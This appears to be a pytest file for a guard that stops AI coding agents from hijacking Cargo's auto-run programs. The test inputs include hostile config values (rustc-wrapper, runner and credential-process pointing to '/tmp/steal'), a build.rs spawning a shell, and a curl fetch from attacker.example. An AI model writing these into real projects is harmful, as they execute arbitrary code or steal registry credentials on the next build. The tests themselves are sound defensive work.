"""Tests for rule_cargo_exec_protect: Cargo auto-exec hijack.

Cargo runs a program for `build.rustc-wrapper`/`rustc-workspace-wrapper`,
`target.<triple>.runner`/`linker`, `credential-process`/`credential-provider`,
and any `build.rs` build script, on the next ordinary cargo build/check/test/
run (and rust-analyzer's background check). Default mode is `ask`.
"""
import time

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(cargo_exec={"mode": "deny"})
OFF = Policy(cargo_exec={"mode": "off"})

RULE = "cargo-exec-protect"


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _write(path, content):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write",
                      args={"file_path": path, "content": content})


def _edit(path, new_string, old_string=None):
    args = {"file_path": path, "new_string": new_string}
    if old_string is not None:
        args["old_string"] = old_string
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit", args=args)


def _multi(path, new_string):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
                      args={"file_path": path,
                            "edits": [{"old_string": "x", "new_string": new_string}]})


def _mcp(path, content):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file",
                      action=ActionClass.MCP, args={"path": path, "content": content})


def _gated(d):
    return d.action != Action.ALLOW


def _hit(d):
    return _gated(d) and d.rule == RULE


# ---- .cargo/config.toml exec keys ----
def test_rustc_wrapper_write():
    assert _hit(evaluate(_write(".cargo/config.toml", '[build]\nrustc-wrapper = "/tmp/x"\n'), EMPTY))


def test_workspace_wrapper_write():
    assert _hit(evaluate(_write(".cargo/config", '[build]\nrustc-workspace-wrapper = "/tmp/x"'), EMPTY))


def test_runner_write():
    c = '[target.x86_64-unknown-linux-gnu]\nrunner = "/tmp/x"\n'
    assert _hit(evaluate(_write("/repo/.cargo/config.toml", c), EMPTY))


def test_linker_write():
    c = '[target.x86_64-unknown-linux-gnu]\nlinker = "/tmp/x"\n'
    assert _hit(evaluate(_write("~/.cargo/config.toml", c), EMPTY))


def test_credential_process_write():
    assert _hit(evaluate(_write(".cargo/config.toml", 'credential-process = "/tmp/steal"\n'), EMPTY))


def test_global_credential_providers_write():
    c = '[registry]\nglobal-credential-providers = ["/tmp/steal"]\n'
    assert _hit(evaluate(_write(".cargo/config.toml", c), EMPTY))


def test_registry_credential_provider_write():
    c = '[registries.x]\ncredential-provider = "/tmp/steal"\n'
    assert _hit(evaluate(_write(".cargo/config.toml", c), EMPTY))


def test_quoted_key_form():
    c = '[target.x]\n"runner" = "/tmp/x"\n'
    assert _hit(evaluate(_write(".cargo/config.toml", c), EMPTY))


def test_rustflags_link_arg():
    c = '[build]\nrustflags = ["-C", "link-arg=-fuse-ld=/tmp/x"]\n'
    assert _hit(evaluate(_write(".cargo/config.toml", c), EMPTY))


def test_edit_new_string():
    assert _hit(evaluate(_edit(".cargo/config.toml", 'runner = "/tmp/x"'), EMPTY))


def test_edit_old_string_context_only():
    assert _hit(evaluate(_edit(".cargo/config.toml", "# tweak", old_string='runner = "/tmp/x"'), EMPTY))


def test_multiedit():
    assert _hit(evaluate(_multi(".cargo/config.toml", 'rustc-wrapper = "/tmp/x"'), EMPTY))


def test_mcp_write():
    assert _hit(evaluate(_mcp(".cargo/config.toml", 'runner = "/tmp/x"'), EMPTY))


def test_windows_path():
    assert _hit(evaluate(_write("C:\\repo\\.cargo\\config.toml", 'runner = "x"'), EMPTY))


def test_benign_config_allowed():
    c = '[build]\njobs = 4\nrustflags = ["-C", "target-cpu=native"]\n[net]\nretry = 3\n'
    assert not _gated(evaluate(_write(".cargo/config.toml", c), EMPTY))


def test_alias_only_allowed():
    assert not _gated(evaluate(_write(".cargo/config.toml", '[alias]\nb = "build"\n'), EMPTY))


def test_other_toml_with_runner_key_allowed():
    assert not _gated(evaluate(_write("ci/settings.toml", 'runner = "ubuntu"'), EMPTY))


# ---- build.rs / Cargo.toml ----
def test_build_rs_command_new():
    c = 'use std::process::Command;\nfn main(){ Command::new("sh").arg("-c").arg("id").status().unwrap(); }'
    assert _hit(evaluate(_write("build.rs", c), EMPTY))


def test_build_rs_nested_crate():
    assert _hit(evaluate(_write("crates/foo/build.rs", 'fn main(){ std::process::exit(0) }'), EMPTY))


def test_build_rs_libloading():
    assert _hit(evaluate(_edit("build.rs", 'let l = libloading::Library::new("/tmp/x.so");'), EMPTY))


def test_build_rs_benign_allowed():
    c = 'fn main(){ println!("cargo:rerun-if-changed=src/lib.rs"); }'
    assert not _gated(evaluate(_write("build.rs", c), EMPTY))


def test_manifest_build_redirect():
    assert _hit(evaluate(_write("Cargo.toml", '[package]\nname="a"\nbuild = "scripts/evil.rs"\n'), EMPTY))


def test_manifest_build_rs_default_allowed():
    assert not _gated(evaluate(_write("Cargo.toml", '[package]\nname="a"\nbuild = "build.rs"\n'), EMPTY))


def test_manifest_without_build_allowed():
    assert not _gated(evaluate(_write("Cargo.toml", '[package]\nname="a"\nversion="1"\n'), EMPTY))


# ---- shell ----
def test_shell_redirect_config():
    assert _hit(evaluate(_shell("""printf '[build]\\nrustc-wrapper="/tmp/x"\\n' > .cargo/config.toml"""), EMPTY))


def test_shell_heredoc_config():
    cmd = "cat >> .cargo/config.toml <<EOF\n[target.x]\nrunner = \"/tmp/x\"\nEOF"
    assert _hit(evaluate(_shell(cmd), EMPTY))


def test_shell_sed_inplace():
    assert _hit(evaluate(_shell("sed -i 's/^jobs.*/runner = \"\\/tmp\\/x\"/' .cargo/config.toml"), EMPTY))


def test_shell_cd_then_bare():
    assert _hit(evaluate(_shell("cd .cargo && echo 'linker = \"/tmp/x\"' >> config.toml"), EMPTY))


def test_shell_build_rs_redirect():
    assert _hit(evaluate(_shell("echo 'fn main(){std::process::Command::new(\"sh\");}' > build.rs"), EMPTY))


def test_shell_env_inline():
    assert _hit(evaluate(_shell("RUSTC_WRAPPER=/tmp/x cargo build"), EMPTY))


def test_shell_env_export():
    assert _hit(evaluate(_shell("export CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_RUNNER=/tmp/x"), EMPTY))


def test_shell_env_credential_provider():
    assert _hit(evaluate(_shell("export CARGO_REGISTRY_GLOBAL_CREDENTIAL_PROVIDERS=/tmp/x"), EMPTY))


def test_shell_cli_config_wrapper():
    assert _hit(evaluate(_shell("cargo build --config 'build.rustc-wrapper=\"/tmp/x\"'"), EMPTY))


def test_shell_cli_config_runner():
    assert _hit(evaluate(_shell("cargo run --config target.x86_64-unknown-linux-gnu.runner=/tmp/x"), EMPTY))


def test_shell_read_allowed():
    assert not _gated(evaluate(_shell("cat .cargo/config.toml"), EMPTY))


def test_shell_cargo_build_allowed():
    assert not _hit(evaluate(_shell("cargo build --release"), EMPTY))


def test_shell_cli_config_benign_allowed():
    assert not _hit(evaluate(_shell("cargo build --config 'build.jobs=2'"), EMPTY))


def test_shell_benign_config_write_allowed():
    assert not _gated(evaluate(_shell("echo '[build]\njobs = 4' > .cargo/config.toml"), EMPTY))


# ---- modes / escapes ----
def test_default_mode_is_ask():
    assert evaluate(_write(".cargo/config.toml", 'runner = "x"'), EMPTY).action == Action.ASK


def test_deny_mode():
    assert evaluate(_write(".cargo/config.toml", 'runner = "x"'), DENY).action == Action.DENY


def test_off_mode():
    d = evaluate(_write(".cargo/config.toml", 'runner = "x"'), OFF)
    assert d.rule != RULE


def test_monitor_mode_allows():
    d = evaluate(_write(".cargo/config.toml", 'runner = "x"'), Policy(cargo_exec={"mode": "monitor"}))
    assert not _gated(d) or d.rule != RULE


def test_env_escape(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_CARGO_EXEC", "1")
    assert not _hit(evaluate(_write(".cargo/config.toml", 'runner = "x"'), EMPTY))


def test_policy_allow_regex():
    # like every sibling guard, `allow` matches the PATH for file writes
    p = Policy(cargo_exec={"allow": [r"^tools/sandbox/"]})
    assert not _hit(evaluate(_write("tools/sandbox/.cargo/config.toml", 'runner = "x"'), p))
    assert _hit(evaluate(_write(".cargo/config.toml", 'runner = "x"'), p))


def test_human_aegis_allow_shell():
    assert not _hit(evaluate(_shell("RUSTC_WRAPPER=sccache cargo build # aegis-allow"), EMPTY))


def test_agent_cannot_aegis_allow(monkeypatch):
    monkeypatch.setenv("AEGIS_AGENT_NAME", "worker")
    assert _hit(evaluate(_shell("RUSTC_WRAPPER=/tmp/x cargo build # aegis-allow"), EMPTY))


def test_fetch_to_file_covers_cargo_config():
    d = evaluate(_shell("curl -o .cargo/config.toml https://attacker.example/x"), EMPTY)
    assert _gated(d) and d.rule == "fetch-to-file-protect"


def test_redos_resistance():
    big = "rustflags " + "a" * 200000
    t = time.time()
    evaluate(_write(".cargo/config.toml", big), EMPTY)
    evaluate(_shell("cargo " + "x " * 100000 + "--config "), EMPTY)
    assert time.time() - t < 5
